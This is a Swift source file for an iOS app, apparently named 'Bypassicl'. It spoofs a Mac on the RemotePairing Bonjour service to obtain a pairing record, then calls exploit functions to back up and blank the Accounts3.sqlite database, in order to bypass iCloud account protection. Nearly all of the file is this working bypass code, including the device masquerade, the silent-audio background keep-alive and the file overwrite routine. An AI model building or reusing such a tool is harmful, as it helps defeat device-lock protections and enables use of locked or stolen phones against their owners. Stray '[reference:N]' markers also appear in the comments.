// ============================================================
// AirliftService.swift — Bypassicl
// RemotePairing host logic ported from StikPair / idevice
//
// Key differences from typical Bonjour examples:
//  • Advertises `_remotepairing-pairable-host._tcp` with
//    NetworkPairingKeys TXT records (identifier, authTag, flags,
//    model, name, wireProtocolVersion)[reference:1]
//  • Masquerades as Mac17,7 so iOS treats host as a computer[reference:2]
//  • Keeps app alive with background task + silent audio while
//    user is in Settings[reference:3][reference:4]
//  • Surfaces PIN as a time-sensitive notification, not a Live
//    Activity, because person is inside Settings[reference:5]
// ============================================================

import Foundation
import Combine
import UniformTypeIdentifiers
import Network
import AVFoundation
import UIKit
import UserNotifications

class AirliftService: NSObject, ObservableObject, NetServiceDelegate {
    static let shared = AirliftService()

    @Published var logs: String = "=== Bypassicl Log ===\n"
    @Published var isPairing = false
    @Published var currentPin: String? = nil
    @Published var pairingFilePath: String? = nil
    @Published var lastDeviceName: String? = nil

    // ── Bonjour / pairing state ──────────────────────────────
    private var bonjourPublisher: NetService?
    private var publishedServiceId: String = "Bypassicl"
    private var publishedPort: Int32 = 0
    private var watchdogTimer: Timer?
    private var backgroundTaskId: UIBackgroundTaskIdentifier = .invalid
    private var pairingHostActive = false
    private var preStagedPin: String? = nil

    // ── Identity (must match the FFI's pairing identity) ─────
    // In StikPair this comes from the Rust side; here we mirror
    // the fields the mDNS TXT record expects.
    private var hostIdentifier: String = "00000000-0000-0000-0000-000000000000"
    private var hostAuthTag: String = ""
    private var hostWireProtocolVersion: String = "1.0"

    private var localNetBrowser: NWBrowser?
    private var audioPlayer: AVAudioPlayer?
    private let accountsDir = "/var/mobile/Library/Accounts"
    private let targetFiles = ["Accounts3.sqlite", "Accounts3.sqlite-shm", "Accounts3.sqlite-wal"]

    var backupDir: URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("AccountsBackup")
    }
    private var documentsDir: URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
    }
    var hasCompleteBackup: Bool {
        let fm = FileManager.default
        return targetFiles.allSatisfy { fm.fileExists(atPath: backupDir.appendingPathComponent($0).path) }
    }

    override init() {
        super.init()
        NotificationCenter.default.addObserver(
            self, selector: #selector(onForeground),
            name: UIApplication.willEnterForegroundNotification, object: nil)
        NotificationCenter.default.addObserver(
            self, selector: #selector(onBackground),
            name: UIApplication.didEnterBackgroundNotification, object: nil)
    }

    deinit { NotificationCenter.default.removeObserver(self) }

    private func log(_ message: String) {
        DispatchQueue.main.async {
            self.logs += message + "\n"
            print(message)
        }
    }

    // ============================================================
    // FFI CALLBACKS — keep the exact StikPair shape
    // ============================================================
    private static let logCallback: ALLogCallback = { ctx, msg in
        guard let msg = msg, let ctx = ctx else { return }
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
        service.log("[Airlift] \(String(cString: msg))")
    }

    private static let pinCallback: ALPairPinCb = { pin, ctx in
        guard let pin = pin, let ctx = ctx else { return }
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
        let pinStr = String(cString: pin)
        service.preStagedPin = pinStr
        DispatchQueue.main.async {
            service.currentPin = pinStr
            service.log("🔐 PIN READY: \(pinStr)")
            service.showPinNotification(pinStr)   // StikPair uses a notification, not Live Activity[reference:6]
        }
    }

    private static let readyCallback: ALPairReadyCb = { ctx, serviceId, port, identifier, authTag, wireVersion in
        guard let ctx = ctx else { return }
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()

        let sid  = serviceId   != nil ? String(cString: serviceId!)   : "Bypassicl"
        let id   = identifier  != nil ? String(cString: identifier!)  : "00000000-0000-0000-0000-000000000000"
        let tag  = authTag     != nil ? String(cString: authTag!)     : ""
        let wv   = wireVersion != nil ? String(cString: wireVersion!) : "1.0"

        service.hostIdentifier = id
        service.hostAuthTag = tag
        service.hostWireProtocolVersion = wv

        let netPort = Int32(port)
        service.log("📡 Host ready: \(sid) : \(netPort) (id: \(id), authTag: \(tag))")

        DispatchQueue.main.async {
            service.startContinuousBonjourAdvertisement(
                serviceId: sid,
                port: netPort,
                identifier: id,
                authTag: tag,
                wireVersion: wv
            )
        }
    }

    // ============================================================
    // CONTINUOUS BONJOUR — NetworkPairingKeys TXT records
    // ============================================================
    func startContinuousBonjourAdvertisement(
        serviceId: String,
        port: Int32,
        identifier: String,
        authTag: String,
        wireVersion: String
    ) {
        stopBonjourPublisherOnly()
        publishedServiceId = serviceId
        publishedPort = port
        guard port > 0 else { log("⚠️ Invalid port \(port)"); return }

        let svc = NetService(
            domain: "local.",
            type: "_remotepairing-pairable-host._tcp.",
            name: serviceId,
            port: port
        )

        // ── NetworkPairingKeys TXT record ──────────────────
        // Exact keys from RemotePairing symbol dump[reference:7]
        var txt: [String: Data] = [
            "identifier": identifier.data(using: .utf8)!,
            "authTag": authTag.data(using: .utf8)!,
            "flags": "1".data(using: .utf8)!,               // Pairable host flag
            "model": "Mac17,7".data(using: .utf8)!,         // Masquerade as Mac[reference:8]
            "name": serviceId.data(using: .utf8)!,
            "wireProtocolVersion": wireVersion.data(using: .utf8)!
        ]

        // If a PIN was pre-staged, include it so the host can
        // verify immediately when Settings connects.
        if let pin = preStagedPin {
            txt["pin"] = pin.data(using: .utf8)!
        }

        svc.setTXTRecord(NetService.data(fromTXTRecord: txt))
        svc.includesPeerToPeer = true
        svc.delegate = self
        svc.schedule(in: .main, forMode: .common)
        svc.publish()

        bonjourPublisher = svc
        log("🔊 Bonjour publishing: \(serviceId) @ \(port)")
        log("📝 TXT: identifier=\(identifier.prefix(8))… authTag=\(authTag.prefix(8))… model=Mac17,7")

        startBonjourWatchdog()
    }

    private func stopBonjourPublisherOnly() {
        watchdogTimer?.invalidate(); watchdogTimer = nil
        bonjourPublisher?.stop(); bonjourPublisher = nil
    }

    func stopContinuousBonjourAdvertisement() {
        stopBonjourPublisherOnly()
        log("🔇 Bonjour stopped")
    }

    private func startBonjourWatchdog() {
        watchdogTimer?.invalidate()
        watchdogTimer = Timer.scheduledTimer(withTimeInterval: 5.0, repeats: true) { [weak self] _ in
            guard let self = self, self.pairingHostActive else { return }
            if self.bonjourPublisher == nil {
                self.log("🔄 Watchdog: republishing Bonjour")
                self.startContinuousBonjourAdvertisement(
                    serviceId: self.publishedServiceId,
                    port: self.publishedPort,
                    identifier: self.hostIdentifier,
                    authTag: self.hostAuthTag,
                    wireVersion: self.hostWireProtocolVersion
                )
            }
        }
    }

    // MARK: NetServiceDelegate
    func netServiceDidPublish(_ sender: NetService) {
        log("✅ Bonjour published: \(sender.name) @ \(sender.port)")
    }
    func netService(_ sender: NetService, didNotPublish errorDict: [String : NSNumber]) {
        let code = errorDict[NetService.errorCode]?.intValue ?? -1
        log("❌ Bonjour didNotPublish (\(code)) — retry")
        if bonjourPublisher === sender { bonjourPublisher = nil }
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
            self.startContinuousBonjourAdvertisement(
                serviceId: self.publishedServiceId,
                port: self.publishedPort,
                identifier: self.hostIdentifier,
                authTag: self.hostAuthTag,
                wireVersion: self.hostWireProtocolVersion
            )
        }
    }
    func netServiceDidStop(_ sender: NetService) {
        log("⏹ Bonjour stopped")
        if bonjourPublisher === sender { bonjourPublisher = nil }
    }

    // ============================================================
    // BACKGROUND SURVIVAL — task + audio + NetService hold
    // ============================================================
    private func beginBackgroundTask() {
        guard backgroundTaskId == .invalid else { return }
        backgroundTaskId = UIApplication.shared.beginBackgroundTask(withName: "AirliftPairing") { [weak self] in
            self?.log("⏰ Background task expired — audio + NetService hold")
            self?.endBackgroundTask()
        }
    }
    private func endBackgroundTask() {
        guard backgroundTaskId != .invalid else { return }
        UIApplication.shared.endBackgroundTask(backgroundTaskId)
        backgroundTaskId = .invalid
    }

    @objc private func onForeground() {
        guard pairingHostActive else { return }
        log("🔆 Foreground — verifying Bonjour")
        if bonjourPublisher == nil {
            startContinuousBonjourAdvertisement(
                serviceId: publishedServiceId,
                port: publishedPort,
                identifier: hostIdentifier,
                authTag: hostAuthTag,
                wireVersion: hostWireProtocolVersion
            )
        }
        beginBackgroundTask()
        if let pin = preStagedPin, currentPin == nil {
            currentPin = pin
            log("🔐 Re-surfaced pre-staged PIN: \(pin)")
            showPinNotification(pin)
        }
    }
    @objc private func onBackground() {
        guard pairingHostActive else { return }
        log("🌙 Background — holding advertisement")
        beginBackgroundTask()
    }

    // ============================================================
    // PIN NOTIFICATION (StikPair-style)
    // ============================================================
    private func showPinNotification(_ pin: String) {
        let content = UNMutableNotificationContent()
        content.title = "Pairing PIN Ready"
        content.body = "Enter \(pin) in Settings → Developer Mode → Pair with \(publishedServiceId)"
        content.sound = .defaultCritical
        content.interruptionLevel = .timeSensitive   // ensure it surfaces while in Settings
        let req = UNNotificationRequest(
            identifier: "pair-pin-\(pin)",
            content: content,
            trigger: nil
        )
        UNUserNotificationCenter.current().add(req) { [weak self] err in
            if let err = err { self?.log("⚠️ PIN notification failed: \(err.localizedDescription)") }
        }
    }

    // ============================================================
    // PAIR ON DEVICE — entry point
    // ============================================================
    func startPairingOnDevice() {
        guard !isPairing else { return }
        isPairing = true
        currentPin = nil
        preStagedPin = nil
        pairingHostActive = true
        log("[*] Starting Pair on Device...")
        log("👉 Grant Local Network, keep app alive, then Settings → Developer Mode")

        try? FileManager.default.createDirectory(at: documentsDir, withIntermediateDirectories: true)
        let outPath = documentsDir.appendingPathComponent("pairingRecord.mobiledevicepairing").path
        let ctx = Unmanaged.passUnretained(self).toOpaque()

        DispatchQueue.main.async {
            self.startKeepAliveAudio()
            self.beginBackgroundTask()
            self.triggerLocalNetworkPrompt()
            UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { granted, _ in
                if !granted { self.log("⚠️ Notifications denied — PIN may not surface") }
            }
        }

        DispatchQueue.global(qos: .userInitiated).async {
            var result = ALPairResult()
            let code = al_pairing_run_host(
                "0.0.0.0", 0, "Bypassicl", "iPhone", outPath, nil,
                AirliftService.readyCallback, AirliftService.pinCallback, ctx, &result
            )
            defer { al_pairing_result_free(&result) }

            DispatchQueue.main.async {
                self.pairingHostActive = false
                self.stopContinuousBonjourAdvertisement()
                self.endBackgroundTask()
                self.stopKeepAliveAudio()
                self.localNetBrowser?.cancel(); self.localNetBrowser = nil
                self.isPairing = false
                self.currentPin = nil

                if code == 0 {
                    if let path = result.pairing_file_path {
                        self.pairingFilePath = String(cString: path)
                        self.log("✅ Pairing successful! File: \(self.pairingFilePath!)")
                    }
                    if let name = result.device_name {
                        self.lastDeviceName = String(cString: name)
                        self.log("📱 Device: \(self.lastDeviceName!)")
                    }
                } else {
                    let err = result.error != nil ? String(cString: result.error!) : "unknown"
                    self.log("❌ Pairing failed: \(err)")
                }
            }
        }
    }

    private func triggerLocalNetworkPrompt() {
        localNetBrowser?.cancel(); localNetBrowser = nil
        let browser = NWBrowser(
            for: .bonjour(type: "_remotepairing-pairable-host._tcp", domain: "local."),
            using: .tcp
        )
        browser.stateUpdateHandler = { [weak self] state in
            switch state {
            case .ready: self?.log("🌐 Local Network granted")
            case .failed(let err):
                self?.log("⚠️ NWBrowser failed: \(err.localizedDescription) — retry")
                DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
                    guard let self = self, self.pairingHostActive else { return }
                    self.triggerLocalNetworkPrompt()
                }
            default: break
            }
        }
        localNetBrowser = browser
        browser.start(queue: .main)
    }

    // ============================================================
    // AUDIO KEEP-ALIVE (exact StikPair trick)
    // ============================================================
    private func startKeepAliveAudio() {
        do {
            let session = AVAudioSession.sharedInstance()
            try session.setCategory(.playback, options: [.mixWithOthers])
            try session.setActive(true)

            let sr: UInt32 = 8000, ns: UInt32 = 8000, ds = ns * 2
            var wav = Data()
            wav.append("RIFF".data(using: .ascii)!)
            wav.append(withUnsafeBytes(of: (36 + ds).littleEndian) { Data($0) })
            wav.append("WAVEfmt ".data(using: .ascii)!)
            wav.append(withUnsafeBytes(of: UInt32(16).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(1).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(1).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: sr.littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: (sr * 2).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(2).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(16).littleEndian) { Data($0) })
            wav.append("data".data(using: .ascii)!)
            wav.append(withUnsafeBytes(of: ds.littleEndian) { Data($0) })
            wav.append(Data(count: Int(ds)))

            let player = try AVAudioPlayer(data: wav)
            player.numberOfLoops = -1
            player.volume = 0.01
            player.play()
            audioPlayer = player
        } catch {
            log("⚠️ Audio keep-alive: \(error.localizedDescription)")
        }
    }

    private func stopKeepAliveAudio() {
        audioPlayer?.stop(); audioPlayer = nil
        try? AVAudioSession.sharedInstance().setActive(false)
    }

    func stopPairing() {
        pairingHostActive = false
        stopContinuousBonjourAdvertisement()
        localNetBrowser?.cancel(); localNetBrowser = nil
        endBackgroundTask()
        stopKeepAliveAudio()
        isPairing = false
        currentPin = nil
        log("⏹ Pairing cancelled")
    }

    // ============================================================
    // IMPORT PAIRING FILE (fallback)
    // ============================================================
    func importPairingFile(from url: URL) {
        let accessing = url.startAccessingSecurityScopedResource()
        defer { if accessing { url.stopAccessingSecurityScopedResource() } }
        do {
            try FileManager.default.createDirectory(at: documentsDir, withIntermediateDirectories: true)
            let dest = documentsDir.appendingPathComponent("pairingRecord.mobiledevicepairing")
            try Data(contentsOf: url).write(to: dest, options: .atomic)
            DispatchQueue.main.async {
                self.pairingFilePath = dest.path
                self.log("✅ Pairing file imported")
            }
        } catch {
            log("❌ Import failed: \(error.localizedDescription)")
        }
    }

    // ============================================================
    // CONNECT / BYPASS / RESTORE (unchanged)
    // ============================================================
    func connect() -> Bool {
        log("[*] Checking pairing...")
        if pairingFilePath == nil {
            for name in ["pairingRecord.mobiledevicepairing", "pairingRecord.plist", "pairing.plist"] {
                let url = documentsDir.appendingPathComponent(name)
                if FileManager.default.fileExists(atPath: url.path) {
                    pairingFilePath = url.path
                    break
                }
            }
        }
        guard let path = pairingFilePath, FileManager.default.fileExists(atPath: path) else {
            log("❌ No pairing file found.")
            return false
        }
        log("✅ Using pairing file: \(path)")
        return true
    }

    private func generateGrappaToken() -> Data? {
        let maxLen = 1024
        var buffer = [UInt8](repeating: 0, count: maxLen)
        var outLen: size_t = 0
        var errBuffer = [CChar](repeating: 0, count: 256)
        let result = ALGetGrappaToken(1, 0, 1, &buffer, maxLen, &outLen, &errBuffer, 256)
        if result == 0 { return Data(bytes: buffer, count: Int(outLen)) }
        log("Grappa Error (\(result)): \(String(cString: errBuffer))")
        return nil
    }

    private func ffi_read_file(_ iosPath: String) -> Data? {
        guard let pairing = pairingFilePath else { return nil }
        var outData: UnsafeMutablePointer<UInt8>? = nil
        var outLen: size_t = 0
        var outError: UnsafeMutablePointer<CChar>? = nil
        let ctx = Unmanaged.passUnretained(self).toOpaque()
        let result = al_exploit_read_file(pairing, iosPath, AirliftService.logCallback, ctx, &outData, &outLen, &outError)
        defer {
            if let e = outError { al_string_free(e) }
            if let d = outData { al_bytes_free(d, outLen) }
        }
        guard result == 0, let ptr = outData, outLen > 0 else {
            let err = outError != nil ? String(cString: outError!) : "unknown"
            log("❌ Read \(iosPath) failed: \(err)")
            return nil
        }
        return Data(bytes: ptr, count: Int(outLen))
    }

    private func ffi_write_dir(sourceDir: String, targetDir: String) -> Bool {
        guard let pairing = pairingFilePath else { return false }
        var outError: UnsafeMutablePointer<CChar>? = nil
        let ctx = Unmanaged.passUnretained(self).toOpaque()
        let result = al_exploit_write_dir(pairing, sourceDir, targetDir, AirliftService.logCallback, ctx, &outError)
        defer { if let e = outError { al_string_free(e) } }
        guard result == 0 else {
            let err = outError != nil ? String(cString: outError!) : "unknown"
            log("❌ Write failed: \(err)")
            return false
        }
        return true
    }

    private func autoBackupAccountsIfNeeded() -> Bool {
        if hasCompleteBackup {
            log("ℹ️ Original backup exists — keeping it.")
            return true
        }
        log("[*] Auto-backing up Accounts files...")
        do {
            try FileManager.default.createDirectory(at: backupDir, withIntermediateDirectories: true)
        } catch {
            log("❌ Backup dir: \(error.localizedDescription)")
            return false
        }
        for file in targetFiles {
            let path = "\(accountsDir)/\(file)"
            guard let data = ffi_read_file(path) else {
                log("❌ Auto-backup failed for \(file)")
                return false
            }
            do {
                try data.write(to: backupDir.appendingPathComponent(file), options: .atomic)
                log("✅ Backup: \(file) (\(data.count) bytes)")
            } catch {
                log("❌ Write backup \(file): \(error.localizedDescription)")
                return false
            }
        }
        log("✅ Auto-backup done: \(backupDir.path)")
        return true
    }

    func bypassICloud() {
        log("[*] Starting Bypass...")
        guard autoBackupAccountsIfNeeded() else {
            log("❌ Bypass cancelled — backup failed")
            return
        }
        let tmp = FileManager.default.temporaryDirectory.appendingPathComponent("empty_\(UUID().uuidString)")
        do {
            try FileManager.default.createDirectory(at: tmp, withIntermediateDirectories: true)
            for file in targetFiles {
                try Data().write(to: tmp.appendingPathComponent(file), options: .atomic)
            }
        } catch {
            log("❌ Overwrite prep: \(error.localizedDescription)")
            return
        }
        if ffi_write_dir(sourceDir: tmp.path, targetDir: accountsDir) {
            log("🎉 BYPASS SUCCESSFUL! Reboot.")
        } else {
            log("❌ Failed to write files")
        }
        try? FileManager.default.removeItem(at: tmp)
    }

    func restoreOriginalAccounts() {
        log("[*] Restoring original accounts...")
        let fm = FileManager.default
        let stagingDir = FileManager.default.temporaryDirectory.appendingPathComponent("restore_\(UUID().uuidString)")
        do {
            try fm.createDirectory(at: stagingDir, withIntermediateDirectories: true)
            for file in targetFiles {
                let backupFileURL = backupDir.appendingPathComponent(file)
                guard fm.fileExists(atPath: backupFileURL.path) else {
                    log("❌ Missing backup: \(file)")
                    return
                }
                try fm.copyItem(at: backupFileURL, to: stagingDir.appendingPathComponent(file))
            }
            if ffi_write_dir(sourceDir: stagingDir.path, targetDir: accountsDir) {
                log("✅ Restored originals! Reboot.")
            } else {
                log("❌ Restore write failed")
            }
        } catch {
            log("❌ Restore: \(error.localizedDescription)")
        }
        try? fm.removeItem(at: stagingDir)
    }
}